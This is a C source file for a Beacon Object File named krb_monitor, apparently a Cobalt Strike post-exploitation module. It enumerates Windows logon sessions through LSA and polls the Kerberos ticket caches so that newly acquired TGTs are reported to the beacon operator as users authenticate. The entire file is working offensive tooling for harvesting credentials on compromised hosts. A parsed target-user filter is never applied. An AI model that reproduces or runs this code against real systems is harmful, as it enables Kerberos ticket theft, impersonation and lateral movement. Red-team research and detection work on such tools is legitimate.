/*
 * krb_monitor - Monitor for new TGTs in logon sessions
 *
 * Continuously watches for new TGT acquisitions and outputs them.
 * Useful for capturing tickets as users authenticate.
 *
 * Usage: krb_monitor [/interval:SECONDS] [/targetuser:USER] [/count:N]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>

/* LSA ticket structures - types defined in ntsecapi.h */
#define KERB_RETRIEVE_ENCODED_TICKET 8

/* Tracked ticket for comparison */
typedef struct _TRACKED_TICKET {
    LUID luid;
    WCHAR serverName[256];
    LARGE_INTEGER startTime;
    bool active;
} TRACKED_TICKET;

#define MAX_TRACKED_TICKETS 256

/* Get tickets for a session */
static int get_session_tickets(HANDLE hLsa, ULONG authPackage, PLUID luid,
                               TRACKED_TICKET* tickets, int maxTickets) {
    NTSTATUS status, subStatus;
    KERB_QUERY_TKT_CACHE_REQUEST request;
    PKERB_QUERY_TKT_CACHE_RESPONSE response = NULL;
    ULONG responseSize = 0;
    int count = 0;

    memset(&request, 0, sizeof(request));
    request.MessageType = KerbQueryTicketCacheMessage;
    if (luid) {
        request.LogonId = *luid;
    }

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa,
        authPackage,
        &request,
        sizeof(request),
        (PVOID*)&response,
        &responseSize,
        &subStatus
    );

    if (status != 0 || !response) {
        return 0;
    }

    for (ULONG i = 0; i < response->CountOfTickets && count < maxTickets; i++) {
        tickets[count].luid = luid ? *luid : (LUID){0};
        tickets[count].startTime = response->Tickets[i].StartTime;
        tickets[count].active = true;

        if (response->Tickets[i].ServerName.Buffer) {
            int copyLen = min(255, response->Tickets[i].ServerName.Length / sizeof(WCHAR));
            memcpy(tickets[count].serverName, response->Tickets[i].ServerName.Buffer,
                   copyLen * sizeof(WCHAR));
            tickets[count].serverName[copyLen] = L'\0';
        } else {
            tickets[count].serverName[0] = L'\0';
        }
        count++;
    }

    SECUR32$LsaFreeReturnBuffer(response);
    return count;
}

/* Check if ticket is a TGT */
static bool is_tgt(WCHAR* serverName) {
    /* TGT service names start with "krbtgt/" */
    return (serverName[0] == L'k' && serverName[1] == L'r' &&
            serverName[2] == L'b' && serverName[3] == L't' &&
            serverName[4] == L'g' && serverName[5] == L't');
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    NTSTATUS status;
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    LSA_STRING kerbName = { 8, 9, "Kerberos" };

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* interval_str = arg_get(&parser, "interval");
    char* targetuser = arg_get(&parser, "targetuser");
    char* count_str = arg_get(&parser, "count");

    int interval = interval_str ? atoi(interval_str) : 60;
    int maxCount = count_str ? atoi(count_str) : 10;  /* Default: check 10 times then exit */

    if (interval < 1) interval = 60;
    if (maxCount < 1) maxCount = 10;

    BeaconFormatPrintf(&output, "[*] Action: Monitor for New TGTs\n\n");
    BeaconFormatPrintf(&output, "[*] Interval    : %d seconds\n", interval);
    BeaconFormatPrintf(&output, "[*] Iterations  : %d\n", maxCount);
    if (targetuser) {
        BeaconFormatPrintf(&output, "[*] Target User : %s\n", targetuser);
    }
    BeaconFormatPrintf(&output, "\n");


    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LSA: 0x%X\n", status);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to lookup Kerberos package: 0x%X\n", status);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    /* Get initial state of tickets */
    static TRACKED_TICKET prevTickets[MAX_TRACKED_TICKETS];
    static TRACKED_TICKET currTickets[MAX_TRACKED_TICKETS];
    int prevCount = 0;
    int currCount = 0;

    /* Enumerate all sessions */
    ULONG sessionCount = 0;
    PLUID sessionList = NULL;

    status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to enumerate sessions: 0x%X\n", status);
        BeaconFormatPrintf(&output, "[*] Note: May require elevation to monitor all sessions\n");
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Monitoring %d logon sessions...\n", sessionCount);
    BeaconFormatPrintf(&output, "[*] Press Ctrl+C in beacon to stop\n\n");

    /* Get initial snapshot */
    for (ULONG i = 0; i < sessionCount && prevCount < MAX_TRACKED_TICKETS - 50; i++) {
        prevCount += get_session_tickets(hLsa, authPackage, &sessionList[i],
                                          &prevTickets[prevCount], MAX_TRACKED_TICKETS - prevCount);
    }

    BeaconFormatPrintf(&output, "[*] Initial ticket count: %d\n", prevCount);
    BeaconFormatPrintf(&output, "[*] Starting monitor loop...\n\n");
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);

    /* Monitor loop */
    for (int iteration = 0; iteration < maxCount; iteration++) {
        KERNEL32$Sleep(interval * 1000);

        BeaconFormatAlloc(&output, 16 * 1024);
        currCount = 0;

        /* Re-enumerate sessions (may have changed) */
        SECUR32$LsaFreeReturnBuffer(sessionList);
        status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList);
        if (status != 0) continue;

        /* Get current tickets */
        for (ULONG i = 0; i < sessionCount && currCount < MAX_TRACKED_TICKETS - 50; i++) {
            currCount += get_session_tickets(hLsa, authPackage, &sessionList[i],
                                              &currTickets[currCount], MAX_TRACKED_TICKETS - currCount);
        }

        /* Compare and find new TGTs */
        int newTgts = 0;
        for (int c = 0; c < currCount; c++) {
            if (!is_tgt(currTickets[c].serverName)) continue;

            bool found = false;
            for (int p = 0; p < prevCount; p++) {
                if (currTickets[c].startTime.QuadPart == prevTickets[p].startTime.QuadPart &&
                    currTickets[c].luid.LowPart == prevTickets[p].luid.LowPart) {
                    found = true;
                    break;
                }
            }

            if (!found) {
                newTgts++;
                char serverName[256];
                MSVCRT$wcstombs(serverName, currTickets[c].serverName, 256);

                BeaconFormatPrintf(&output, "[+] NEW TGT DETECTED!\n");
                BeaconFormatPrintf(&output, "    LUID   : 0x%X\n", currTickets[c].luid.LowPart);
                BeaconFormatPrintf(&output, "    Server : %s\n\n", serverName);
            }
        }

        if (newTgts > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        }

        BeaconFormatFree(&output);

        /* Copy current to previous */
        memcpy(prevTickets, currTickets, sizeof(TRACKED_TICKET) * currCount);
        prevCount = currCount;
    }

    BeaconFormatAlloc(&output, 1024);
    BeaconFormatPrintf(&output, "[*] Monitor completed after %d iterations\n", maxCount);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    if (sessionList) SECUR32$LsaFreeReturnBuffer(sessionList);
    if (hLsa) SECUR32$LsaDeregisterLogonProcess(hLsa);
    BeaconFormatFree(&output);
    if (interval_str) free(interval_str);
    if (targetuser) free(targetuser);
    if (count_str) free(count_str);
}
